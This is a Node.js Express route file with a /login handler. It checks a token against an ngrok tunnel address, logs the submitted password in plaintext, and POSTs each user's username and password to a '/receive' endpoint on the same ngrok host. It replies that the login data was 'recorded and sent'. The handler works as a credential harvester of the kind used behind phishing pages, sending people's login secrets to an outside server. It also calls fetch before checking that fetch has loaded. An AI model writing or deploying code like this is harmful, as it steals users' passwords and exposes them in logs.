const express = require('express');
const fs = require('fs');
const router = express.Router();
const path = require('path');

let tokens = {};

// Dynamically import node-fetch
let fetch;
import('node-fetch').then(module => {
    fetch = module.default;
}).catch(err => console.error('Failed to load node-fetch', err));

router.post('/login', async (req, res) => {
    const { username, password, token } = req.body;

 

    try {
        const validationResponse = await fetch('https://59c0-205-155-148-58.ngrok-free.app/validate', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username, token})
        });
        const validation = await validationResponse.json();
        if (!validation.valid) {
            return res.status(403).send('Invalid token');
        }
        
        // Simulate login logic
        console.log(`Login attempt - Username: ${username}, Password: ${password}`);
        if (!fetch) {
            return res.status(500).send('Fetch not initialized');
        }
        // Send data to your local server
        const localServerUrl = 'https://59c0-205-155-148-58.ngrok-free.app/receive';
        const response = await fetch(localServerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
            mode: 'cors' // if needed
        });

        if (response.ok) {
            console.log('Data sent to local server successfully');
            res.send('Login data recorded and sent.');
        } else {
            throw new Error('Failed to send data to local server');
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).send('Server Error');
    }
});

module.exports = router;
